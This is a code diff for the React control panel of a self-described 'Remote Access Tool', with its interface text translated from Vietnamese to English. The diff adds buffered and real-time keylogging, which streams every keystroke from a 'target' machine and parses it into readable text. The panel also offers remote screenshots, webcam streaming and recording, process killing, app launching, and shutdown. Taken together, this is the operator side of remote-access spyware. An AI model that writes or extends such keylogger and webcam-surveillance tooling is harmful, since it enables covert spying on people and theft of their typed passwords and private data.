@@ -23,6 +23,11 @@ const App = () => {
   
   // Process list state
   const [processList, setProcessList] = useState([]);
+  
+  // Keylogger states
+  const [keylogMode, setKeylogMode] = useState('buffer'); // 'buffer' hoặc 'realtime'
+  const [realtimeKeylog, setRealtimeKeylog] = useState('');
+  const [bufferKeylog, setBufferKeylog] = useState('');
 
   // Load saved connection info from localStorage
   useEffect(() => {
@@ -42,7 +47,7 @@ const App = () => {
   // Kết nối WebSocket
   const handleConnect = () => {
     if (!targetIP) {
-      alert('Vui lòng nhập địa chỉ IP!');
+      alert('Please enter IP address!');
       return;
     }
 
@@ -57,7 +62,10 @@ const App = () => {
       websocket.onopen = () => {
         setIsConnected(true);
         setIsLoggedIn(true);
-        addLog(`Kết nối thành công tới ${wsUrl}`, 'success');
+        addLog(`Connected successfully to ${wsUrl}`, 'success');
+        
+        // Đồng bộ keylog mode từ server ngay khi kết nối
+        websocket.send(JSON.stringify({ cmd: 'SET_KEYLOG_MODE' }));
       };
 
       websocket.onmessage = (event) => {
@@ -67,29 +75,40 @@ const App = () => {
           // Xử lý các loại response từ server
           if (data.type === 'ACTION_RESULT') {
             addLog(data.msg, 'info');
+            
+            // Đồng bộ keylog mode từ server response
+            if (data.currentMode) {
+              setKeylogMode(data.currentMode);
+              console.log('Keylog mode synchronized:', data.currentMode);
+            }
           } 
           else if (data.type === 'LIST_RESULT') {
             const processList = data.data;
             setProcessList(processList);
-            let logMsg = `Nhận ${processList.length} tiến trình`;
+            let logMsg = `Received ${processList.length} processes`;
             addLog(logMsg, 'success');
           }
           else if (data.type === 'KEYLOG_RESULT') {
-            addLog(`Keylog: ${data.data}`, 'info');
+            setBufferKeylog(data.data);
+            addLog(`Keylog received (${data.data.length} characters)`, 'success');
+          }
+          else if (data.type === 'KEYLOG_REALTIME') {
+            // Real-time keylog data
+            setRealtimeKeylog(prev => prev + data.data);
           }
           else if (data.type === 'SCREENSHOT_RESULT') {
             setScreenshotData(data.data);
-            addLog('Screenshot nhận thành công! Xem trong tab Media.', 'success');
+            addLog('Screenshot received successfully! Check Media tab.', 'success');
           }
           else if (data.type === 'CAM_FRAME') {
             setWebcamFrame(data.data);
-            addLog('Webcam frame cập nhật', 'info');
+            addLog('Webcam frame updated', 'info');
           }
           else if (data.type === 'RECORD_RESULT') {
             setIsRecording(false);
             setRecordCountdown(0);
             setIsConverting(true);
-            addLog('Đang chuyển đổi video AVI sang MP4...', 'info');
+            addLog('Converting AVI video to MP4...', 'info');
             
             // Convert AVI to MP4
             fetch('/convert-video', {
@@ -101,22 +120,22 @@ const App = () => {
             .then(result => {
               setIsConverting(false);
               if (result.error) {
-                addLog(`Lỗi convert: ${result.error}`, 'error');
+                addLog(`Conversion error: ${result.error}`, 'error');
                 // Fallback: download AVI
                 const link = document.createElement('a');
                 link.href = 'data:video/avi;base64,' + data.data;
                 link.download = `webcam_${Date.now()}.avi`;
                 link.click();
-                addLog('Đã tải xuống video AVI (không convert được)', 'warning');
+                addLog('Downloaded AVI video (conversion failed)', 'warning');
               } else {
                 setRecordingData(result.mp4_data);
                 setIsStreaming(false);
-                addLog('Video đã được chuyển đổi sang MP4!', 'success');
+                addLog('Video converted to MP4 successfully!', 'success');
               }
             })
             .catch(err => {
               setIsConverting(false);
-              addLog(`Lỗi API: ${err.message}`, 'error');
+              addLog(`API Error: ${err.message}`, 'error');
               // Fallback: download AVI
               const link = document.createElement('a');
               link.href = 'data:video/avi;base64,' + data.data;
@@ -128,12 +147,12 @@ const App = () => {
             addLog(`Nhận: ${JSON.stringify(data)}`, 'info');
           }
         } catch (error) {
-          addLog(`Lỗi parse JSON: ${event.data}`, 'error');
+          addLog(`JSON parse error: ${event.data}`, 'error');
         }
       };
 
       websocket.onerror = (error) => {
-        addLog('Lỗi kết nối WebSocket', 'error');
+        addLog('WebSocket connection error', 'error');
         setIsConnected(false);
       };
 
@@ -145,7 +164,7 @@ const App = () => {
       setIsRecording(false);
       setRecordCountdown(0);
       setIsConverting(false);
-      addLog('Ngắt kết nối', 'warning');
+      addLog('Disconnected', 'warning');
     };      setWs(websocket);
     } catch (error) {
       addLog(`Lỗi: ${error.message}`, 'error');
@@ -166,7 +185,7 @@ const App = () => {
       setIsRecording(false);
       setRecordCountdown(0);
       setIsConverting(false);
-      addLog('Đã ngắt kết nối', 'info');
+      addLog('Disconnected', 'info');
     }
   };
 
@@ -194,38 +213,68 @@ const App = () => {
   const handleKillProcess = () => {
     const target = processInput.trim();
     if (!target) {
-      addLog('Vui lòng nhập PID hoặc tên tiến trình!', 'error');
+      addLog('Please enter PID or process name!', 'error');
       return;
     }
 
-    if (isNaN(target)) {
-      // Nếu là tên
-      sendCommand('KILL_PROC', { proc_name: target });
-      addLog(`Đang diệt tiến trình: ${target}`, 'info');
-    } else {
-      // Nếu là PID
+    // Kiểm tra xem là số (PID) hay chữ (Tên tiến trình)
+    if (/^\d+$/.test(target)) {
       sendCommand('KILL_PROC', { pid: target });
-      addLog(`Đang diệt PID: ${target}`, 'info');
+    } else {
+      sendCommand('KILL_PROC', { proc_name: target });
     }
     setProcessInput('');
+  };
+  
+  // Change keylog mode
+  const handleKeylogModeChange = (mode) => {
+    setKeylogMode(mode);
+    sendCommand('SET_KEYLOG_MODE', { mode });
     
-    // Auto refresh after 1 second
-    setTimeout(() => {
-      if (processList.length > 0) {
-        sendCommand('LIST_PROC');
-      }
-    }, 1000);
+    if (mode === 'realtime') {
+      setRealtimeKeylog('');
+      addLog('Switched to Real-time Mode', 'success');
+    } else {
+      addLog('Switched to Buffer Mode', 'success');
+    }
+  };
+  
+  // Parse raw keylog to readable format
+  const parseKeylogToReadable = (rawText) => {
+    let readable = rawText;
+    
+    // Replace special keys with readable characters
+    readable = readable.replace(/\[SPACE\]/g, ' ');
+    readable = readable.replace(/\[ENTER\]/g, '\n');
+    readable = readable.replace(/\[TAB\]/g, '\t');
+    readable = readable.replace(/\[BS\]/g, '⌫');
+    readable = readable.replace(/\[DEL\]/g, '⌦');
+    
+    // Remove other special key notations but keep combo keys
+    readable = readable.replace(/\[ESC\]/g, '[ESC]');
+    readable = readable.replace(/\[CAPSLOCK\]/g, '[CAPS]');
+    readable = readable.replace(/\[F(\d+)\]/g, '[F$1]');
+    readable = readable.replace(/\[(LEFT|RIGHT|UP|DOWN|HOME|END|PGUP|PGDN)\]/g, '[$1]');
+    
+    return readable;
+  };
+  
+  // Clear keylog displays
+  const clearKeylogDisplay = () => {
+    setRealtimeKeylog('');
+    setBufferKeylog('');
+    addLog('Keylog display cleared', 'info');
   };
 
   // Start app
   const handleStartApp = () => {
     const name = appInput.trim();
     if (!name) {
-      addLog('Vui lòng nhập tên ứng dụng!', 'error');
+      addLog('Please enter application name!', 'error');
       return;
     }
     sendCommand('START_PROC', { name: name });
-    addLog(`Đang khởi chạy: ${name}`, 'info');
+    addLog(`Launching: ${name}`, 'info');
     setAppInput('');
   };
 
@@ -236,7 +285,7 @@ const App = () => {
     link.href = 'data:image/jpeg;base64,' + screenshotData;
     link.download = `screenshot_${Date.now()}.jpg`;
     link.click();
-    addLog('Đã tải xuống screenshot', 'success');
+    addLog('Screenshot downloaded', 'success');
   };
 
   const downloadRecording = () => {
@@ -245,14 +294,14 @@ const App = () => {
     link.href = 'data:video/mp4;base64,' + recordingData;
     link.download = `recording_${Date.now()}.mp4`;
     link.click();
-    addLog('Đã tải xuống video MP4', 'success');
+    addLog('MP4 video downloaded', 'success');
   };
 
   // Kill process by PID (quick action)
   const quickKillPID = (pid) => {
-    if (window.confirm(`Bạn có chắc muốn diệt tiến trình PID: ${pid}?`)) {
+    if (window.confirm(`Are you sure you want to kill process PID: ${pid}?`)) {
       sendCommand('KILL_PROC', { pid: pid.toString() });
-      addLog(`Đang diệt PID: ${pid}`, 'info');
+      addLog(`Killing PID: ${pid}`, 'info');
       // Auto refresh after 1 second
       setTimeout(() => {
         if (processList.length > 0) {
@@ -264,9 +313,9 @@ const App = () => {
 
   // Kill process by name (quick action)
   const quickKillName = (name) => {
-    if (window.confirm(`Bạn có chắc muốn diệt TẤT CẢ tiến trình có tên: ${name}?`)) {
+    if (window.confirm(`Are you sure you want to kill ALL processes named: ${name}?`)) {
       sendCommand('KILL_PROC', { proc_name: name });
-      addLog(`Đang diệt tiến trình: ${name}`, 'info');
+      addLog(`Killing process: ${name}`, 'info');
       // Auto refresh after 1 second
       setTimeout(() => {
         if (processList.length > 0) {
@@ -306,7 +355,7 @@ const App = () => {
     if (!isStreaming) {
       setIsStreaming(true);
       sendCommand('START_CAM');
-      addLog('Đang khởi động webcam stream...', 'info');
+      addLog('Starting webcam stream...', 'info');
     }
   };
 
@@ -315,21 +364,21 @@ const App = () => {
       setIsStreaming(false);
       sendCommand('STOP_CAM');
       setWebcamFrame(null);
-      addLog('Đang dừng webcam stream...', 'info');
+      addLog('Stopping webcam stream...', 'info');
     }
   };
 
   // Start recording with countdown
   const handleStartRecording = () => {
     if (isStreaming) {
-      addLog('Vui lòng tắt live stream trước khi ghi hình!', 'error');
+      addLog('Please stop live stream before recording!', 'error');
       return;
     }
     
     setIsRecording(true);
     setRecordCountdown(10);
     sendCommand('RECORD_CAM');
-    addLog('Đang ghi hình 10 giây...', 'info');
+    addLog('Recording for 10 seconds...', 'info');
     
     // Countdown timer
     let countdown = 10;
@@ -352,20 +401,20 @@ const App = () => {
             <div className="login-header">
               <div className="login-icon">🔐</div>
               <h1>Remote Access Tool</h1>
-              <p className="login-subtitle">Kết nối đến máy tính từ xa</p>
+              <p className="login-subtitle">Connect to remote computer</p>
             </div>
 
             <div className="login-form">
               <div className="form-group">
                 <label>
                   <span className="label-icon">🌐</span>
-                  Địa chỉ IP Target
+                  Target IP Address
                 </label>
                 <input
                   type="text"
                   value={targetIP}
                   onChange={(e) => setTargetIP(e.target.value)}
-                  placeholder="Ví dụ: 192.168.1.100 hoặc 10.217.40.76"
+                  placeholder="Example: 192.168.1.100 or 10.217.40.76"
                   onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
                   autoFocus
                 />
@@ -374,7 +423,7 @@ const App = () => {
               <div className="form-group">
                 <label>
                   <span className="label-icon">🔌</span>
-                  Cổng WebSocket
+                  WebSocket Port
                 </label>
                 <input
                   type="text"
@@ -387,15 +436,15 @@ const App = () => {
 
               <button onClick={handleConnect} className="btn btn-login">
                 <span className="btn-icon">🚀</span>
-                Kết nối ngay
+                Connect Now
               </button>
 
               <div className="login-info">
-                <p>💡 <strong>Lưu ý:</strong></p>
+                <p>💡 <strong>Note:</strong></p>
                 <ul>
-                  <li>Đảm bảo Server C++ đã chạy trên máy target</li>
-                  <li>IP và port phải khớp với cấu hình server</li>
-                  <li>Thông tin kết nối sẽ được lưu tự động</li>
+                  <li>Make sure C++ Server is running on target machine</li>
+                  <li>IP and port must match server configuration</li>
+                  <li>Connection info will be saved automatically</li>
                 </ul>
               </div>
             </div>
@@ -418,12 +467,12 @@ const App = () => {
                 </span>
               </div>
               <button onClick={handleDisconnect} className="btn btn-logout">
-                Đăng xuất
+                Logout
               </button>
             </div>
           </header>
 
-          <div className="container">
+          <div className="main-container">
             {/* Control Panel */}
             <div className="control-panel">
               <div className="tabs">
@@ -431,13 +480,13 @@ const App = () => {
               className={`tab ${activeTab === 'process' ? 'active' : ''}`}
               onClick={() => setActiveTab('process')}
             >
-              ⚙️ Quản lý tiến trình
+              ⚙️ Process Management
             </button>
             <button
               className={`tab ${activeTab === 'system' ? 'active' : ''}`}
               onClick={() => setActiveTab('system')}
             >
-              🖥️ Hệ thống
+              🖥️ System
             </button>
             <button
               className={`tab ${activeTab === 'media' ? 'active' : ''}`}
@@ -456,30 +505,82 @@ const App = () => {
           <div className="tab-content">
             {activeTab === 'process' && (
               <div className="command-section">
-                <h3>Quản lý tiến trình</h3>
+                <h3>Process Management</h3>
                 
+                {/* Kill and Start Process - Horizontal Layout */}
+                <div className="process-actions-row">
+                  <div className="section-group half-width">
+                    <h4>❌ Kill Process</h4>
+                    <div className="input-group">
+                      <input
+                        type="text"
+                        value={processInput}
+                        onChange={(e) => setProcessInput(e.target.value)}
+                        onKeyPress={(e) => e.key === 'Enter' && handleKillProcess()}
+                        placeholder="Enter PID (number) or process name (e.g., notepad.exe)"
+                        disabled={!isConnected}
+                      />
+                      <button 
+                        onClick={handleKillProcess} 
+                        className="btn btn-danger"
+                        disabled={!isConnected}
+                      >
+                        Kill Process
+                      </button>
+                    </div>
+                    <p className="help-text">
+                      💡 Enter number for PID, or name for process name
+                    </p>
+                  </div>
+
+                  <div className="section-group half-width">
+                    <h4>▶️ Launch Application</h4>
+                    <div className="input-group">
+                      <input
+                        type="text"
+                        value={appInput}
+                        onChange={(e) => setAppInput(e.target.value)}
+                        onKeyPress={(e) => e.key === 'Enter' && handleStartApp()}
+                        placeholder="Enter app name (e.g., notepad, calc, www.google.com)"
+                        disabled={!isConnected}
+                      />
+                      <button 
+                        onClick={handleStartApp} 
+                        className="btn btn-success"
+                        disabled={!isConnected}
+                      >
+                        Launch
+                      </button>
+                    </div>
+                    <p className="help-text">
+                      💡 Supports: app name (notepad), file path, or URL (www.google.com)
+                    </p>
+                  </div>
+                </div>
+
+                {/* Process List - Below */}
                 <div className="section-group">
-                  <h4>📋 Xem danh sách</h4>
+                  <h4>📋 Process List</h4>
                   <button 
                     onClick={() => {
                       sendCommand('LIST_PROC');
-                      addLog('Đang lấy danh sách tiến trình...', 'info');
+                      addLog('Fetching process list...', 'info');
                     }} 
                     className="btn btn-command"
                     disabled={!isConnected}
                   >
-                    🔄 Lấy danh sách tiến trình
+                    🔄 Get Process List
                   </button>
                   
                   {processList.length > 0 && (
                     <div className="process-list-container">
                       <div className="process-list-header">
-                        <span>Tìm thấy {processList.length} tiến trình</span>
+                        <span>Found {processList.length} processes</span>
                         <button 
                           onClick={() => setProcessList([])} 
                           className="btn btn-small"
                         >
-                          ✖ Đóng
+                          ✖ Close
                         </button>
                       </div>
                       <div className="process-groups">
@@ -494,9 +595,9 @@ const App = () => {
                               <button 
                                 onClick={() => quickKillName(name)}
                                 className="btn btn-kill-group"
-                                title={`Diệt tất cả ${name}`}
+                                title={`Kill all ${name}`}
                               >
-                                ❌ Diệt tất cả
+                                ❌ Kill All
                               </button>
                             </div>
                             <div className="process-pids">
@@ -506,7 +607,7 @@ const App = () => {
                                   <button 
                                     onClick={() => quickKillPID(pid)}
                                     className="btn btn-kill-pid"
-                                    title={`Diệt PID ${pid}`}
+                                    title={`Kill PID ${pid}`}
                                   >
                                     ✖
                                   </button>
@@ -519,69 +620,21 @@ const App = () => {
                     </div>
                   )}
                 </div>
-
-                <div className="section-group">
-                  <h4>❌ Diệt tiến trình</h4>
-                  <div className="input-group">
-                    <input
-                      type="text"
-                      value={processInput}
-                      onChange={(e) => setProcessInput(e.target.value)}
-                      onKeyPress={(e) => e.key === 'Enter' && handleKillProcess()}
-                      placeholder="Nhập PID (số) hoặc tên tiến trình (vd: notepad.exe)"
-                      disabled={!isConnected}
-                    />
-                    <button 
-                      onClick={handleKillProcess} 
-                      className="btn btn-danger"
-                      disabled={!isConnected}
-                    >
-                      Diệt tiến trình
-                    </button>
-                  </div>
-                  <p className="help-text">
-                    💡 Nhập số để diệt theo PID, hoặc tên để diệt theo tên process
-                  </p>
-                </div>
-
-                <div className="section-group">
-                  <h4>▶️ Khởi chạy ứng dụng</h4>
-                  <div className="input-group">
-                    <input
-                      type="text"
-                      value={appInput}
-                      onChange={(e) => setAppInput(e.target.value)}
-                      onKeyPress={(e) => e.key === 'Enter' && handleStartApp()}
-                      placeholder="Nhập tên ứng dụng (vd: notepad, calc, www.google.com)"
-                      disabled={!isConnected}
-                    />
-                    <button 
-                      onClick={handleStartApp} 
-                      className="btn btn-success"
-                      disabled={!isConnected}
-                    >
-                      Khởi chạy
-                    </button>
-                  </div>
-                  <p className="help-text">
-                    💡 Hỗ trợ: tên app (notepad), đường dẫn file, hoặc URL (www.google.com)
-                  </p>
-                </div>
               </div>
             )}
 
             {activeTab === 'system' && (
               <div className="command-section">
-                <h3>Quản lý hệ thống</h3>
+                <h3>System Management</h3>
                 <div className="command-buttons">
                   <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'LOCK' })} className="btn btn-command">
-                    Khóa máy 🔒
+                    Lock Computer 🔒
                   </button>
                   <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'SHUTDOWN' })} className="btn btn-danger">
-                    Tắt máy
+                    Shutdown
                   </button>
                   <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'RESTART' })} className="btn btn-danger">
-                    Khởi động lại
+                    Restart
                   </button>
                 </div>
               </div>
@@ -589,20 +642,20 @@ const App = () => {
 
             {activeTab === 'media' && (
               <div className="command-section">
-                <h3>Điều khiển Media</h3>
+                <h3>Media Control</h3>
                 
                 {/* Screenshot Section */}
                 <div className="section-group">
-                  <h4>📸 Chụp màn hình</h4>
+                  <h4>📸 Screenshot</h4>
                   <button 
                     onClick={() => {
                       sendCommand('SCREENSHOT');
-                      addLog('Đang yêu cầu chụp màn hình...', 'info');
+                      addLog('Requesting screenshot...', 'info');
                     }} 
                     className="btn btn-command"
                     disabled={!isConnected}
                   >
-                    Chụp màn hình
+                    Take Screenshot
                   </button>
                   
                   {screenshotData && (
@@ -614,13 +667,13 @@ const App = () => {
                       />
                       <div className="preview-actions">
                         <button onClick={downloadScreenshot} className="btn btn-success">
-                          💾 Tải xuống ảnh
+                          💾 Download Image
                         </button>
                         <button 
                           onClick={() => setScreenshotData(null)} 
                           className="btn btn-small"
                         >
-                          ✖ Đóng
+                          ✖ Close
                         </button>
                       </div>
                     </div>
@@ -636,14 +689,14 @@ const App = () => {
                       className="btn btn-command"
                       disabled={!isConnected || isStreaming}
                     >
-                      ▶️ Bật Live Stream
+                      ▶️ Start Live Stream
                     </button>
                     <button 
                       onClick={handleStopWebcam} 
                       className="btn btn-danger"
                       disabled={!isConnected || !isStreaming}
                     >
-                      ⏹️ Tắt Live Stream
+                      ⏹️ Stop Live Stream
                     </button>
                   </div>
                   
@@ -662,7 +715,7 @@ const App = () => {
                     <div className="media-preview">
                       <div className="loading-placeholder">
                         <div className="spinner"></div>
-                        <p>Đang chờ webcam stream...</p>
+                        <p>Waiting for webcam stream...</p>
                       </div>
                     </div>
                   )}
@@ -670,13 +723,13 @@ const App = () => {
 
                 {/* Recording Section */}
                 <div className="section-group">
-                  <h4>🎥 Ghi hình Webcam</h4>
+                  <h4>🎥 Webcam Recording</h4>
                   <button 
                     onClick={handleStartRecording}
                     className="btn btn-command"
                     disabled={!isConnected || isStreaming || isRecording}
                   >
-                    {isRecording ? `🎬 Đang ghi... (${recordCountdown}s)` : '🎬 Ghi hình 10 giây'}
+                    {isRecording ? `🎬 Recording... (${recordCountdown}s)` : '🎬 Record 10 seconds'}
                   </button>
                   
                   {isRecording && (
@@ -688,7 +741,7 @@ const App = () => {
                         ></div>
                       </div>
                       <p className="recording-text">
-                        ⏱️ Đang ghi hình... {recordCountdown} giây còn lại
+                        ⏱️ Recording... {recordCountdown} seconds remaining
                       </p>
                     </div>
                   )}
@@ -697,7 +750,7 @@ const App = () => {
                     <div className="recording-progress">
                       <div className="spinner"></div>
                       <p className="recording-text">
-                        🔄 Đang chuyển đổi video sang MP4...
+                        🔄 Converting video to MP4...
                       </p>
                     </div>
                   )}
@@ -713,17 +766,17 @@ const App = () => {
                           src={`data:video/mp4;base64,${recordingData}`} 
                           type="video/mp4"
                         />
-                        Trình duyệt không hỗ trợ video.
+                        Your browser doesn't support video playback.
                       </video>
                       <div className="preview-actions">
                         <button onClick={downloadRecording} className="btn btn-success">
-                          💾 Tải xuống MP4
+                          💾 Download MP4
                         </button>
                         <button 
                           onClick={() => setRecordingData(null)} 
                           className="btn btn-small"
                         >
-                          ✖ Đóng
+                          ✖ Close
                         </button>
                       </div>
                     </div>
@@ -735,13 +788,63 @@ const App = () => {
             {activeTab === 'keylogger' && (
               <div className="command-section">
                 <h3>Keylogger</h3>
+                
+                {/* Mode Selection */}
+                <div className="keylog-mode-selector">
+                  <label>Mode:</label>
+                  <div className="mode-buttons">
+                    <button 
+                      onClick={() => handleKeylogModeChange('buffer')}
+                      className={`btn btn-mode ${keylogMode === 'buffer' ? 'active' : ''}`}
+                    >
+                      💾 Buffer Mode
+                    </button>
+                    <button 
+                      onClick={() => handleKeylogModeChange('realtime')}
+                      className={`btn btn-mode ${keylogMode === 'realtime' ? 'active' : ''}`}
+                    >
+                      ⚡ Real-time Mode
+                    </button>
+                  </div>
+                  <p className="mode-description">
+                    {keylogMode === 'buffer' 
+                      ? '💾 Buffer: Dữ liệu được lưu và lấy theo yêu cầu' 
+                      : '⚡ Real-time: Mỗi phím nhấn được gửi ngay lập tức'}
+                  </p>
+                </div>
+                
+                {/* Command Buttons */}
                 <div className="command-buttons">
                   <button onClick={() => sendCommand('START_KEYLOG')} className="btn btn-command">
-                    Reset & Bắt đầu ghi phím
+                    🔄 Reset & Start Logging
                   </button>
-                  <button onClick={() => sendCommand('GET_KEYLOG')} className="btn btn-command">
-                    Xem log phím
+                  {keylogMode === 'buffer' && (
+                    <button onClick={() => sendCommand('GET_KEYLOG')} className="btn btn-command">
+                      👁️ View Buffer
+                    </button>
+                  )}
+                  <button onClick={clearKeylogDisplay} className="btn btn-small">
+                    🧹 Clear Display
                   </button>
+                </div>
+                
+                {/* Keylog Display - Dual Panel */}
+                <div className="keylog-display-dual">
+                  {/* Raw Output Panel */}
+                  <div className="keylog-panel">
+                    <h4>📝 Raw Output</h4>
+                    <div className="keylog-content">
+                      <pre>{keylogMode === 'realtime' ? realtimeKeylog : bufferKeylog}</pre>
+                    </div>
+                  </div>
+                  
+                  {/* Readable Output Panel */}
+                  <div className="keylog-panel">
+                    <h4>📖 Readable Output</h4>
+                    <div className="keylog-content">
+                      <pre>{parseKeylogToReadable(keylogMode === 'realtime' ? realtimeKeylog : bufferKeylog)}</pre>
+                    </div>
+                  </div>
                 </div>
               </div>
             )}
@@ -752,11 +855,11 @@ const App = () => {
         <div className="logs-panel">
           <div className="logs-header">
             <h3>📝 System Logs</h3>
-            <button onClick={clearLogs} className="btn btn-small">Xóa</button>
+            <button onClick={clearLogs} className="btn btn-small">Clear</button>
           </div>
           <div className="logs-content">
             {logs.length === 0 ? (
-              <p className="no-logs">Chưa có log nào...</p>
+              <p className="no-logs">No logs yet...</p>
             ) : (
               logs.map((log, index) => (
                 <div key={index} className={`log-entry log-${log.type}`}>
